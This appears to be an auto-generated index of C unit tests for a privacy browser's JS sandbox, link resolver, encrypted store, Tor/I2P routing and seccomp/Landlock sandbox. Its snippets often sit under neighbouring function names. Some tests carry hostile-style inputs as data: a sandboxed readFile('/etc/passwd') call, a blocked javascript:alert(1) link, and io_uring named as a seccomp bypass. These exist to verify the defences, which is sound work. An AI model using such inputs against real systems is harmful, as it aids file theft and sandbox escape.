- `test_validate_rejects_empty` (line 38) `static void test_validate_rejects_empty(void **state)`
- `test_validate_rejects_oversize` (line 43) `static void test_validate_rejects_oversize(void **state)`
- `test_validate_accepts_within_cap` (line 50) `static void test_validate_accepts_within_cap(void **state)`
- `test_context_new_and_free` (line 57) `static void test_context_new_and_free(void **state)` - *static void test_validate_rejects_oversize(void **state) { (void)state; js_limits l = js_limits_default(); l.max_source_bytes = 4; assert_int_equal(js_validate_source("12345", 5, &l), JS_ERR_TOO_LARGE); } static void test_validate_accepts_within_cap(void **state) { (void)state; assert_int_equal(js_validate_source("1+1", 3, NULL), JS_OK); } /* --- context lifecycle ---*
- `test_context_new_null_out` (line 65) `static void test_context_new_null_out(void **state)`
- `test_eval_arithmetic` (line 72) `static void test_eval_arithmetic(void **state)` - *static void test_context_new_and_free(void **state) { (void)state; js_context *ctx = NULL; assert_int_equal(js_context_new(NULL, &ctx), JS_OK); assert_non_null(ctx); js_context_free(ctx); } static void test_context_new_null_out(void **state) { (void)state; assert_int_equal(js_context_new(NULL, NULL), JS_ERR_NULL_ARG); } /* --- evaluation: values ---*
- `test_eval_string_concat` (line 86) `static void test_eval_string_concat(void **state)`
- `test_eval_syntax_error` (line 98) `static void test_eval_syntax_error(void **state)` - *js_context_free(ctx); } static void test_eval_string_concat(void **state) { (void)state; js_result r; memset(&r, 0, sizeof r); assert_int_equal(js_eval_once("'a'+'b'", 7, NULL, &r), JS_OK); assert_non_null(r.value); assert_string_equal(r.value, "ab"); js_result_free(&r); } /* --- errors: syntax vs runtime ---*
- `test_eval_runtime_exception` (line 107) `static void test_eval_runtime_exception(void **state)`
- `test_no_io_globals` (line 121) `static void test_no_io_globals(void **state)` - *static void test_eval_runtime_exception(void **state) { (void)state; js_result r; memset(&r, 0, sizeof r); assert_int_equal(js_eval_once("throw new Error('boom')", 23, NULL, &r), JS_ERR_RUNTIME); assert_int_equal(r.is_exception, 1); assert_non_null(r.value); assert_non_null(strstr(r.value, "boom")); js_result_free(&r); } /* --- sandbox escape resistance ---*
- `test_filesystem_access_is_reference_error` (line 134) `static void test_filesystem_access_is_reference_error(void **state)`
- `test_infinite_loop_times_out` (line 147) `static void test_infinite_loop_times_out(void **state)` - *} static void test_filesystem_access_is_reference_error(void **state) { (void)state; js_result r; memset(&r, 0, sizeof r); const char *src = "readFile('/etc/passwd')"; /* readFile is not defined: a clean ReferenceError, not host access. assert_int_equal(js_eval_once(src, strlen(src), NULL, &r), JS_ERR_RUNTIME); assert_int_equal(r.is_exception, 1); js_result_free(&r); } /* --- resource limits ---*
- `assert_int_equal` (line 154) `assert_int_equal(js_eval_once("while(true)`
- `test_set_time_budget_applies` (line 161) `static void test_set_time_budget_applies(void **state)` - *js_set_time_budget lowers the wall-clock cap armed on subsequent evals, so a caller can enforce a single page-wide budget across many evaluations. A tiny * budget interrupts an infinite loop; a NULL context is a safe no-op.*
- `assert_int_equal` (line 169) `assert_int_equal(js_eval(ctx, "while(true)`
- `test_memory_limit_is_enforced` (line 177) `static void test_memory_limit_is_enforced(void **state)`
- `test_result_free_on_zeroed` (line 193) `static void test_result_free_on_zeroed(void **state)` - *Unbounded object allocation exhausts the heap and is denied by the cap. (A doubling string instead trips the engine's max-string-length first, * which is a normal RangeError, not a memory-exhaustion event.) const char *src = "var a=[];for(;;){a.push([0,1,2,3,4,5,6,7,8,9]);}"; assert_int_equal(js_eval_once(src, strlen(src), &l, &r), JS_ERR_MEMORY); js_result_free(&r); } /* --- memory safety ---*
- `test_context_free_null_and_double` (line 202) `static void test_context_free_null_and_double(void **state)`
- `test_eval_null_args` (line 210) `static void test_eval_null_args(void **state)`
- `test_loc_parses_named_frame` (line 224) `static void test_loc_parses_named_frame(void **state)` - *static void test_eval_null_args(void **state) { (void)state; js_context *ctx = NULL; assert_int_equal(js_context_new(NULL, &ctx), JS_OK); js_result r; memset(&r, 0, sizeof r); assert_int_equal(js_eval(NULL, "1", 1, &r), JS_ERR_NULL_ARG); assert_int_equal(js_eval(ctx, NULL, 1, &r), JS_ERR_NULL_ARG); assert_int_equal(js_eval(ctx, "1", 1, NULL), JS_ERR_NULL_ARG); js_context_free(ctx); } /* --- js_loc_from_stack (pure parser) ---*
- `test_loc_parses_bare_frame` (line 235) `static void test_loc_parses_bare_frame(void **state)`
- `test_loc_file_may_contain_colons` (line 244) `static void test_loc_file_may_contain_colons(void **state)`
- `test_loc_line_only_sets_col_zero` (line 255) `static void test_loc_line_only_sets_col_zero(void **state)`
- `test_loc_truncates_to_cap` (line 264) `static void test_loc_truncates_to_cap(void **state)`
- `test_loc_rejects_garbage_and_null` (line 272) `static void test_loc_rejects_garbage_and_null(void **state)`
- `test_eval_named_captures_location` (line 287) `static void test_eval_named_captures_location(void **state)` - *static void test_loc_rejects_garbage_and_null(void **state) { (void)state; char file[16]; int line = 9, col = 9; assert_int_equal(js_loc_from_stack(NULL, file, sizeof file, &line, &col), 0); assert_string_equal(file, ""); /* emptied assert_int_equal(line, 0); assert_int_equal(col, 0); assert_int_equal(js_loc_from_stack("native code, no numbers", file, sizeof file, &line, &col), 0); assert_int_equal(js_loc_from_stack("", file, sizeof file, &line, &col), 0); /* NULL outputs must be tolerated. assert_int_equal(js_loc_from_stack("    at q (f:1:2)", NULL, 0, NULL, NULL), 1); } /* --- js_eval_named: an uncaught error carries its throw site ---*
- `test_eval_named_null_filename_defaults` (line 308) `static void test_eval_named_null_filename_defaults(void **state)`
- `test_eval_thrown_primitive_has_no_location` (line 323) `static void test_eval_thrown_primitive_has_no_location(void **state)`
- `main` (line 339) `int main(void)`

#### `test_link_nav.c`
**Path:** `tests/test_link_nav.c`

**Functions:**
- `test_null_out` (line 23) `static void test_null_out(void **state)` - *#include <setjmp.h> #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <string.h> #include <cmocka.h> #include "link_nav.h" static ln_result R; /* reused per assertion for brevity /* --- argument handling ---*
- `test_null_href_blocked` (line 28) `static void test_null_href_blocked(void **state)`
- `test_fragment_is_same_document` (line 36) `static void test_fragment_is_same_document(void **state)` - */* --- argument handling --- static void test_null_out(void **state) { (void)state; assert_int_equal(ln_resolve("https://h/", "/x", NULL), LN_ERR_NULL_ARG); } static void test_null_href_blocked(void **state) { (void)state; assert_int_equal(ln_resolve("https://h.example/", NULL, &R), LN_OK); assert_int_equal(R.action, LN_BLOCKED); } /* --- fragments / empty ---*
- `test_https_absolute` (line 48) `static void test_https_absolute(void **state)` - */* --- fragments / empty --- static void test_fragment_is_same_document(void **state) { (void)state; assert_int_equal(ln_resolve("https://h.example/a", "#section", &R), LN_OK); assert_int_equal(R.action, LN_SAME_DOCUMENT); assert_string_equal(R.target, ""); assert_int_equal(ln_resolve("https://h.example/a", "", &R), LN_OK); assert_int_equal(R.action, LN_SAME_DOCUMENT); } /* --- https base ---*
- `test_https_relative` (line 56) `static void test_https_relative(void **state)`
- `test_https_absolute_path_and_parent` (line 64) `static void test_https_absolute_path_and_parent(void **state)`
- `test_https_blocks_downgrade_and_schemes` (line 75) `static void test_https_blocks_downgrade_and_schemes(void **state)`
- `test_https_scheme_relative` (line 90) `static void test_https_scheme_relative(void **state)`
- `test_resolve_long_bundle_target` (line 101) `static void test_resolve_long_bundle_target(void **state)` - *Modern bundle URLs exceed the old 4096 target cap (google's xjs URL is 3456 bytes BEFORE resolution; longer ones exist): a link/script href resolving to > 4096 * bytes must still navigate.*
- `test_href_cleaning` (line 113) `static void test_href_cleaning(void **state)` - *BEFORE resolution; longer ones exist): a link/script href resolving to > 4096 * bytes must still navigate. static void test_resolve_long_bundle_target(void **state) { (void)state; static char href[4601]; href[0] = '/'; memset(href + 1, 'x', 4499); href[4500] = '\0'; assert_int_equal(ln_resolve("https://e.example/page", href, &R), LN_OK); assert_int_equal(R.action, LN_NAVIGATE); assert_true(strlen(R.target) > 4096);   /* used to overflow LN_MAX_TARGET } /* --- href cleaning ---*
- `test_file_relative` (line 124) `static void test_file_relative(void **state)` - *} /* --- href cleaning --- static void test_href_cleaning(void **state) { (void)state; /* Surrounding whitespace and embedded tab/newline/CR are stripped. assert_int_equal(ln_resolve("https://h.example/", "  https://b.example/\tpa\nth\r  ", &R), LN_OK); assert_int_equal(R.action, LN_NAVIGATE); assert_string_equal(R.target, "https://b.example/path"); } /* --- local file base ---*
- `test_file_parent` (line 132) `static void test_file_parent(void **state)`
- `test_file_absolute_path` (line 140) `static void test_file_absolute_path(void **state)`
- `test_file_drops_fragment` (line 148) `static void test_file_drops_fragment(void **state)`
- `test_file_base_to_https` (line 156) `static void test_file_base_to_https(void **state)`
- `test_file_base_blocks_schemes_and_scheme_relative` (line 164) `static void test_file_base_blocks_schemes_and_scheme_relative(void **state)`
- `test_no_base` (line 178) `static void test_no_base(void **state)` - *static void test_file_base_blocks_schemes_and_scheme_relative(void **state) { (void)state; assert_int_equal(ln_resolve("/home/u/a.html", "http://h.example/", &R), LN_OK); assert_int_equal(R.action, LN_BLOCKED); assert_int_equal(ln_resolve("/home/u/a.html", "javascript:alert(1)", &R), LN_OK); assert_int_equal(R.action, LN_BLOCKED); assert_int_equal(ln_resolve("/home/u/a.html", "//h.example/x", &R), LN_OK); assert_int_equal(R.action, LN_BLOCKED); } /* --- no base ---*
- `test_overflow_blocked` (line 194) `static void test_overflow_blocked(void **state)` - *(void)state; assert_int_equal(ln_resolve(NULL, "https://h.example/x", &R), LN_OK); assert_int_equal(R.action, LN_NAVIGATE); assert_int_equal(R.kind, LN_TARGET_HTTPS); assert_string_equal(R.target, "https://h.example/x"); assert_int_equal(ln_resolve(NULL, "relative/path", &R), LN_OK); assert_int_equal(R.action, LN_BLOCKED); assert_int_equal(ln_resolve(NULL, "http://h.example/", &R), LN_OK); assert_int_equal(R.action, LN_BLOCKED); } /* --- overflow fails closed ---*
- `test_block_reasons` (line 206) `static void test_block_reasons(void **state)` - */* --- overflow fails closed --- static void test_overflow_blocked(void **state) { (void)state; char big[LN_MAX_TARGET + 64]; memcpy(big, "https://h.example/", 18); memset(big + 18, 'a', sizeof big - 19); big[sizeof big - 1] = '\0'; assert_int_equal(ln_resolve("https://h.example/", big, &R), LN_OK); assert_int_equal(R.action, LN_BLOCKED); } /* --- block reasons (for the precise UI notice) ---*
- `test_block_reason_text` (line 233) `static void test_block_reason_text(void **state)`
- `test_fragment_capture` (line 243) `static void test_fragment_capture(void **state)` - *assert_int_equal(ln_resolve("https://h.example/", "/x", &R), LN_OK); assert_int_equal(R.action, LN_NAVIGATE); assert_int_equal(R.reason, LN_BLOCK_NONE); } static void test_block_reason_text(void **state) { (void)state; assert_string_equal(ln_block_reason_text(LN_BLOCK_DOWNGRADE), "blocked: insecure http link"); assert_non_null(ln_block_reason_text(LN_BLOCK_FOREIGN_SCHEME)); assert_non_null(ln_block_reason_text(LN_BLOCK_NO_BASE)); assert_non_null(ln_block_reason_text((ln_block_reason)999)); /* unknown is safe } /* --- fragment capture (for a later anchor scroll) ---*
- `main` (line 272) `int main(void)`

#### `test_local_store.c`
**Path:** `tests/test_local_store.c`

**Functions:**
- `roundtrip_raw` (line 29) `static void roundtrip_raw(ls_aead aead)` - *#include <cmocka.h> #include "local_store.h" static const uint8_t KEY[LS_KEY_LEN] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, }; static const char PT[] = "freedom: secret bookmark https://example.onion"; /* --- raw-key round trip, both AEADs ---*
- `test_roundtrip_aes` (line 47) `static void test_roundtrip_aes(void **s)`
- `test_roundtrip_chacha` (line 49) `static void test_roundtrip_chacha(void **s)`
- `test_empty_plaintext` (line 52) `static void test_empty_plaintext(void **s)` - *assert_int_equal(blob_len, LS_OVERHEAD + (sizeof PT - 1)); assert_int_equal(ls_open(KEY, blob, blob_len, &out, &out_len), LS_OK); assert_int_equal(out_len, sizeof PT - 1); assert_memory_equal(out, PT, sizeof PT - 1); ls_free(blob, blob_len); ls_free(out, out_len); } static void test_roundtrip_aes(void **s) { (void)s; roundtrip_raw(LS_AEAD_AES256_GCM); } static void test_roundtrip_chacha(void **s) { (void)s; roundtrip_raw(LS_AEAD_CHACHA20_POLY1305); } /* --- empty plaintext ---*
- `test_wrong_key` (line 66) `static void test_wrong_key(void **s)` - *static void test_empty_plaintext(void **s) { (void)s; uint8_t *blob = NULL, *out = NULL; size_t blob_len = 0, out_len = 99; assert_int_equal(ls_seal(KEY, LS_AEAD_AES256_GCM, NULL, 0, &blob, &blob_len), LS_OK); assert_int_equal(blob_len, LS_OVERHEAD); assert_int_equal(ls_open(KEY, blob, blob_len, &out, &out_len), LS_OK); assert_int_equal(out_len, 0); ls_free(blob, blob_len); ls_free(out, out_len); } /* --- wrong key fails closed ---*
- `tamper_at` (line 84) `static void tamper_at(size_t off)` - *size_t blob_len = 0, out_len = 1; assert_int_equal( ls_seal(KEY, LS_AEAD_AES256_GCM, (const uint8_t *)PT, sizeof PT - 1, &blob, &blob_len), LS_OK); uint8_t bad[LS_KEY_LEN]; memcpy(bad, KEY, LS_KEY_LEN); bad[0] ^= 0x80; assert_int_equal(ls_open(bad, blob, blob_len, &out, &out_len), LS_ERR_AUTH); assert_null(out); /* no plaintext released ls_free(blob, blob_len); } /* --- tampering any region fails closed ---*
- `test_tamper_ciphertext` (line 98) `static void test_tamper_ciphertext(void **s)`
- `test_tamper_tag` (line 100) `static void test_tamper_tag(void **s)`
- `test_tamper_nonce` (line 101) `static void test_tamper_nonce(void **s)`
- `test_tamper_salt` (line 102) `static void test_tamper_salt(void **s)`
- `test_tamper_aead_id` (line 103) `static void test_tamper_aead_id(void **s)`
- `test_nondeterministic` (line 106) `static void test_nondeterministic(void **s)` - *blob[off] ^= 0x01; ls_status st = ls_open(KEY, blob, blob_len, &out, &out_len); assert_true(st == LS_ERR_AUTH || st == LS_ERR_FORMAT); assert_null(out); ls_free(blob, blob_len); } static void test_tamper_ciphertext(void **s) { (void)s; tamper_at(LS_HEADER_LEN + 2); } static void test_tamper_tag(void **s)        { (void)s; tamper_at(LS_OVERHEAD + (sizeof PT - 1) - 1); } static void test_tamper_nonce(void **s)      { (void)s; tamper_at(24); } static void test_tamper_salt(void **s)       { (void)s; tamper_at(8); } static void test_tamper_aead_id(void **s)    { (void)s; tamper_at(5); } /* --- nondeterministic output (random nonce/salt) ---*
- `test_passphrase_roundtrip` (line 120) `static void test_passphrase_roundtrip(void **s)` - *static void test_nondeterministic(void **s) { (void)s; uint8_t *a = NULL, *b = NULL; size_t al = 0, bl = 0; assert_int_equal(ls_seal(KEY, LS_AEAD_AES256_GCM, (const uint8_t *)PT, sizeof PT - 1, &a, &al), LS_OK); assert_int_equal(ls_seal(KEY, LS_AEAD_AES256_GCM, (const uint8_t *)PT, sizeof PT - 1, &b, &bl), LS_OK); assert_int_equal(al, bl); assert_memory_not_equal(a, b, al); /* different nonce => different blob ls_free(a, al); ls_free(b, bl); } /* --- passphrase round trip + wrong passphrase ---*
- `test_derive_key` (line 148) `static void test_derive_key(void **s)` - *assert_memory_equal(out, PT, sizeof PT - 1); ls_free(out, out_len); const char *wrong = "Tr0ub4dor&3"; uint8_t *out2 = (uint8_t *)0x1; size_t out2_len = 1; assert_int_equal( ls_open_passphrase((const uint8_t *)wrong, strlen(wrong), blob, blob_len, &out2, &out2_len), LS_ERR_AUTH); assert_null(out2); ls_free(blob, blob_len); } /* --- KDF determinism ---*
- `test_format_errors` (line 165) `static void test_format_errors(void **s)` - *const char *pass = "passphrase"; uint8_t salt1[LS_SALT_LEN], salt2[LS_SALT_LEN]; memset(salt1, 0xAA, sizeof salt1); memset(salt2, 0xBB, sizeof salt2); uint8_t k1[LS_KEY_LEN], k1b[LS_KEY_LEN], k2[LS_KEY_LEN]; assert_int_equal(ls_derive_key((const uint8_t *)pass, strlen(pass), salt1, sizeof salt1, k1), LS_OK); assert_int_equal(ls_derive_key((const uint8_t *)pass, strlen(pass), salt1, sizeof salt1, k1b), LS_OK); assert_int_equal(ls_derive_key((const uint8_t *)pass, strlen(pass), salt2, sizeof salt2, k2), LS_OK); assert_memory_equal(k1, k1b, LS_KEY_LEN);    /* same salt => same key assert_memory_not_equal(k1, k2, LS_KEY_LEN); /* different salt => different key } /* --- format and argument validation ---*
- `test_null_and_limits` (line 180) `static void test_null_and_limits(void **s)`
- `main` (line 192) `int main(void)`

#### `test_net_realm.c`
**Path:** `tests/test_net_realm.c`

**Functions:**
- `test_classify_host_onion` (line 21) `static void test_classify_host_onion(void **state)` - *.i2p only via I2P) and fail-closed (missing proxy or unclassifiable URL => blocked).  #include <setjmp.h> #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <string.h> #include <cmocka.h> #include "net_realm.h" /* --- nr_classify_host ---*
- `test_classify_host_i2p` (line 29) `static void test_classify_host_i2p(void **state)`
- `test_classify_host_clearnet` (line 36) `static void test_classify_host_clearnet(void **state)`
- `test_classify_host_lookalikes` (line 44) `static void test_classify_host_lookalikes(void **state)` - *static void test_classify_host_i2p(void **state) { (void)state; assert_int_equal(nr_classify_host("stats.i2p"), NR_I2P); assert_int_equal(nr_classify_host("a.b.i2p"), NR_I2P); assert_int_equal(nr_classify_host("SITE.I2P"), NR_I2P); } static void test_classify_host_clearnet(void **state) { (void)state; assert_int_equal(nr_classify_host("example.com"), NR_CLEARNET); assert_int_equal(nr_classify_host("news.ycombinator.com"), NR_CLEARNET); } /* Lookalikes that must NOT be treated as a realm (the suffix is the FINAL label).*
- `test_classify_host_edges` (line 53) `static void test_classify_host_edges(void **state)`
- `test_classify_url` (line 66) `static void test_classify_url(void **state)` - *} static void test_classify_host_edges(void **state) { (void)state; assert_int_equal(nr_classify_host(NULL), NR_CLEARNET); assert_int_equal(nr_classify_host(""), NR_CLEARNET); assert_int_equal(nr_classify_host(".onion"), NR_CLEARNET);  /* empty leading label char big[300]; memset(big, 'a', sizeof big); big[sizeof big - 1] = '\0'; assert_int_equal(nr_classify_host(big), NR_CLEARNET);       /* oversize } /* --- nr_classify_url ---*
- `test_route_onion` (line 78) `static void test_route_onion(void **state)` - */* --- nr_classify_url --- static void test_classify_url(void **state) { (void)state; assert_int_equal(nr_classify_url("https://abc.onion/path?q=1"), NR_ONION); assert_int_equal(nr_classify_url("http://site.i2p/"), NR_I2P); assert_int_equal(nr_classify_url("https://example.com:443/x"), NR_CLEARNET); assert_int_equal(nr_classify_url("https://host.onion:8080/"), NR_ONION); assert_int_equal(nr_classify_url("garbage-no-host"), NR_CLEARNET); assert_int_equal(nr_classify_url(NULL), NR_CLEARNET); } /* --- nr_route_for: the routing table ---*
- `test_route_i2p` (line 87) `static void test_route_i2p(void **state)`
- `test_route_clearnet` (line 95) `static void test_route_clearnet(void **state)`
- `test_route_null_blocked` (line 109) `static void test_route_null_blocked(void **state)`
- `test_realm_allows_http` (line 117) `static void test_realm_allows_http(void **state)` - *assert_int_equal(nr_route_for("https://example.com/", direct), NR_ROUTE_DIRECT); assert_int_equal(nr_route_for("https://example.com/", tor_no_torify), NR_ROUTE_DIRECT); assert_int_equal(nr_route_for("https://example.com/", torify), NR_ROUTE_TOR); /* torify requested but Tor not enabled: clearnet stays direct (torify is moot). assert_int_equal(nr_route_for("https://example.com/", torify_but_no_tor), NR_ROUTE_DIRECT); } static void test_route_null_blocked(void **state) { (void)state; nr_config all_on = { .tor_enabled = 1, .i2p_enabled = 1, .torify_clearnet = 1 }; assert_int_equal(nr_route_for(NULL, all_on), NR_ROUTE_BLOCKED); } /* --- name helpers ---*
- `test_names` (line 125) `static void test_names(void **state)`
- `main` (line 139) `int main(void)`

#### `test_os_sandbox.c`
**Path:** `tests/test_os_sandbox.c`

**Functions:**
- `test_policy_allows_safe` (line 42) `static void test_policy_allows_safe(void **state)` - *#include <stdlib.h> #include <linux/audit.h> #include <sys/mman.h> #include <sys/prctl.h> #include <sys/resource.h> #include <sys/socket.h> #include <sys/stat.h> #include <sys/syscall.h> #include <sys/wait.h> #include <unistd.h> #include "os_sandbox.h" /* --- pure policy ---*
- `test_policy_denies_dangerous` (line 50) `static void test_policy_denies_dangerous(void **state)`
- `test_policy_denies_io_uring` (line 64) `static void test_policy_denies_io_uring(void **state)` - *io_uring is a seccomp-bypass primitive (its IORING_OP_* operations are dispatched without re-entering the syscall entry point the BPF filters), so none of its three entry syscalls may ever be on the allowlist. Locks the deny-by-default invariant so * nobody can quietly add io_uring "for async I/O" (see spec/os_sandbox.md §13).*
- `test_policy_size` (line 70) `static void test_policy_size(void **state)`
- `test_harden_kills_denied_syscall` (line 79) `static void test_harden_kills_denied_syscall(void **state)` - *(void)state; assert_false(os_policy_allows(__NR_io_uring_setup)); assert_false(os_policy_allows(__NR_io_uring_enter)); assert_false(os_policy_allows(__NR_io_uring_register)); } static void test_policy_size(void **state) { (void)state; assert_true(os_policy_size() > 0); } /* --- enforcement (fork-based) --- /* KILL: a denied syscall must terminate the child with SIGSYS.*
- `test_harden_allows_permitted_syscall` (line 96) `static void test_harden_allows_permitted_syscall(void **state)` - *assert_true(pid >= 0); if (pid == 0) { if (os_harden(OS_VIOLATION_KILL) != OS_OK) _exit(98); (void)syscall(__NR_getpid); /* allowed: must survive (void)syscall(__NR_socket, AF_INET, SOCK_STREAM, 0); /* denied -> SIGSYS _exit(0); /* reached only if the filter failed to block } int st = 0; assert_int_equal(waitpid(pid, &st, 0), pid); assert_true(WIFSIGNALED(st)); assert_int_equal(WTERMSIG(st), SIGSYS); } /* KILL: an allowed syscall must pass and let the child exit cleanly.*
- `test_harden_errno_denies_with_eperm` (line 112) `static void test_harden_errno_denies_with_eperm(void **state)` - *pid_t pid = fork(); assert_true(pid >= 0); if (pid == 0) { if (os_harden(OS_VIOLATION_KILL) != OS_OK) _exit(98); long p = syscall(__NR_getpid); _exit(p > 0 ? 42 : 43); } int st = 0; assert_int_equal(waitpid(pid, &st, 0), pid); assert_true(WIFEXITED(st)); assert_int_equal(WEXITSTATUS(st), 42); } /* ERRNO: a denied syscall must return -1/EPERM instead of killing.*
- `test_harden_kills_io_uring_setup` (line 130) `static void test_harden_kills_io_uring_setup(void **state)` - *KILL: io_uring_setup (the mandatory entry point of the whole subsystem -- no ring exists without it) must be killed with SIGSYS. Proves a compromised worker cannot * stand up an io_uring instance to smuggle openat/connect past the BPF filter.*
- `test_prot_allowed_wx` (line 151) `static void test_prot_allowed_wx(void **state)` - *Pure mirror: mmap/mprotect are members of the allowlist but lose the request * when it asks for PROT_EXEC; other syscalls keep their membership decision.*
- `test_harden_blocks_exec_mmap` (line 162) `static void test_harden_blocks_exec_mmap(void **state)` - *Pure mirror: mmap/mprotect are members of the allowlist but lose the request * when it asks for PROT_EXEC; other syscalls keep their membership decision. static void test_prot_allowed_wx(void **state) { (void)state; assert_true(os_prot_allowed(__NR_mmap, PROT_READ | PROT_WRITE)); assert_false(os_prot_allowed(__NR_mmap, PROT_READ | PROT_EXEC)); assert_false(os_prot_allowed(__NR_mprotect, PROT_EXEC)); assert_true(os_prot_allowed(__NR_read, 0));             /* non-memory: allowed assert_true(os_prot_allowed(__NR_munmap, 0));           /* memory, not prot-filtered assert_false(os_prot_allowed(__NR_socket, PROT_READ));  /* denied stays denied } /* KILL: a PROT_READ|PROT_WRITE mmap survives but a PROT_EXEC mmap is killed.*
- `test_harden_blocks_exec_mprotect` (line 182) `static void test_harden_blocks_exec_mprotect(void **state)` - *long rw = syscall(__NR_mmap, (void *)0, (size_t)4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, (off_t)0); if (rw == -1) _exit(60); /* a benign RW mapping must still work (void)syscall(__NR_mmap, (void *)0, (size_t)4096, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, (off_t)0); _exit(0); /* reached only if the exec mapping was NOT blocked } int st = 0; assert_int_equal(waitpid(pid, &st, 0), pid); assert_true(WIFSIGNALED(st)); assert_int_equal(WTERMSIG(st), SIGSYS); } /* KILL: flipping a writable page to executable via mprotect is killed.*
- `test_no_dump_undumpable` (line 214) `static void test_no_dump_undumpable(void **state)` - *Probed BEFORE seccomp so prctl/getrlimit are still reachable: after os_no_dump * the process is undumpable and the core-file limit is zero.*
- `test_landlock_abi_present` (line 232) `static void test_landlock_abi_present(void **state)` - *if (pid == 0) { if (os_no_dump() != OS_OK) _exit(98); if (prctl(PR_GET_DUMPABLE) != 0) _exit(70); struct rlimit rl; if (getrlimit(RLIMIT_CORE, &rl) != 0) _exit(71); _exit(rl.rlim_cur == 0 ? 42 : 72); } int st = 0; assert_int_equal(waitpid(pid, &st, 0), pid); assert_true(WIFEXITED(st)); assert_int_equal(WEXITSTATUS(st), 42); } /* --- Landlock filesystem confinement ---*
- `test_landlock_deny_all` (line 239) `static void test_landlock_deny_all(void **state)` - *int st = 0; assert_int_equal(waitpid(pid, &st, 0), pid); assert_true(WIFEXITED(st)); assert_int_equal(WEXITSTATUS(st), 42); } /* --- Landlock filesystem confinement --- static void test_landlock_abi_present(void **state) { (void)state; assert_true(os_landlock_abi() > 0); /* this host supports Landlock } /* deny-all: after restricting with no rules, opening any file must fail EACCES.*
- `test_landlock_allow_read` (line 257) `static void test_landlock_allow_read(void **state)` - *allow-read: a read rule on a temp dir lets reads inside through and blocks * everything else.*
- `net_ns_inode` (line 304) `static unsigned long net_ns_inode(void)` - *The pure flag set: the worker requests an isolated network (no remote access), * a user namespace (the unprivileged enabler), and IPC + UTS isolation. static void test_namespace_flags(void **state) { (void)state; int f = os_namespace_flags(); assert_true((f & CLONE_NEWNET) != 0);   /* no network: the worker never fetches assert_true((f & CLONE_NEWUSER) != 0);  /* enables the rest unprivileged assert_true((f & CLONE_NEWIPC) != 0); assert_true((f & CLONE_NEWUTS) != 0); } /* The net-namespace inode of a process. Returns 0 on failure.*
- `suite` (line 313) `* suite (it is best-effort defense in depth), and on a host that allows them the
 * isolation mus...`
- `main` (line 334) `int main(void)`

**Macros:**
- `_GNU_SOURCE` (line 13)

#### `test_page_view.c`
**Path:** `tests/test_page_view.c`

**Functions:**
- `parse` (line 27) `static hp_document *parse(const char *html)` - *#include <stdint.h> #include <stdlib.h> #include <setjmp.h> #include <string.h> #include <cmocka.h> #include "box_style.h" #include "css.h" #include "dom.h" #include "flex_layout.h" #include "html_parse.h" #include "page_view.h" /* Parse helper: aborts the test on parse failure. Caller frees *doc.*
- `find_text` (line 35) `static const pv_run *find_text(const pv_view *v, const char *text)` - *#include "dom.h" #include "flex_layout.h" #include "html_parse.h" #include "page_view.h" /* Parse helper: aborts the test on parse failure. Caller frees *doc. static hp_document *parse(const char *html) { hp_document *doc = NULL; assert_int_equal(hp_parse(html, strlen(html), NULL, &doc), HP_OK); assert_non_null(doc); return doc; } /* Finds the i-th run whose collapsed text equals `text`; NULL if none.*
- `find_image` (line 44) `static const pv_run *find_image(const pv_view *v, const char *src)` - *assert_non_null(doc); return doc; } /* Finds the i-th run whose collapsed text equals `text`; NULL if none. static const pv_run *find_text(const pv_view *v, const char *text) { for (size_t i = 0; i < pv_count(v); ++i) { const pv_run *r = pv_at(v, i); if (r->text != NULL && strcmp(r->text, text) == 0) return r; } return NULL; } /* Finds the first image run whose src equals `src`; NULL if none.*
- `find_video` (line 53) `static const pv_run *find_video(const pv_view *v, const char *src)` - *} return NULL; } /* Finds the first image run whose src equals `src`; NULL if none. static const pv_run *find_image(const pv_view *v, const char *src) { for (size_t i = 0; i < pv_count(v); ++i) { const pv_run *r = pv_at(v, i); if (r->kind == PV_IMAGE && r->src != NULL && strcmp(r->src, src) == 0) return r; } return NULL; } /* Finds the first video run whose src equals `src`; NULL if none.*
- `test_new_is_empty` (line 62) `static void test_new_is_empty(void **state)` - *} return NULL; } /* Finds the first video run whose src equals `src`; NULL if none. static const pv_run *find_video(const pv_view *v, const char *src) { for (size_t i = 0; i < pv_count(v); ++i) { const pv_run *r = pv_at(v, i); if (r->kind == PV_VIDEO && r->src != NULL && strcmp(r->src, src) == 0) return r; } return NULL; } /* --- pure model: pv_new / pv_append / pv_free ---*
- `test_append_copies_fields` (line 71) `static void test_append_copies_fields(void **state)`
- `test_append_image_copies_fields` (line 98) `static void test_append_image_copies_fields(void **state)`
- `test_append_image_null_args` (line 114) `static void test_append_image_null_args(void **state)`
- `test_append_transcodes_latin1` (line 130) `static void test_append_transcodes_latin1(void **state)` - *A lone high byte that is invalid UTF-8 is reinterpreted as Windows-1252 (a superset of Latin-1) and re-emitted as UTF-8, recovering accents from a legacy * page rather than dropping them to '?'. 0xE1 -> U+00E1 (a-acute) -> 0xC3 0xA1.*
- `test_append_transcodes_word` (line 140) `static void test_append_transcodes_word(void **state)` - *A lone high byte that is invalid UTF-8 is reinterpreted as Windows-1252 (a superset of Latin-1) and re-emitted as UTF-8, recovering accents from a legacy * page rather than dropping them to '?'. 0xE1 -> U+00E1 (a-acute) -> 0xC3 0xA1. static void test_append_transcodes_latin1(void **state) { (void)state; pv_view *v = pv_new(); const char latin1[] = { 'I', 'm', (char)0xE1, 'g', '\0' }; /* lone 0xE1 = a-acute assert_int_equal(pv_append(v, PV_TEXT, 0, 0, latin1, NULL), PV_OK); assert_string_equal(pv_at(v, 0)->text, "Im\xC3\xA1g"); /* "Imág" pv_free(v); } /* 0xE9 -> U+00E9 (e-acute); a full word of Latin-1 accents round-trips to UTF-8.*
- `test_append_transcodes_cp1252_quotes` (line 151) `static void test_append_transcodes_cp1252_quotes(void **state)` - *Windows-1252 0x80-0x9F carry printable glyphs (unlike Latin-1 C1 controls): * 0x93/0x94 are curly double quotes -> U+201C/U+201D (3-byte UTF-8 each).*
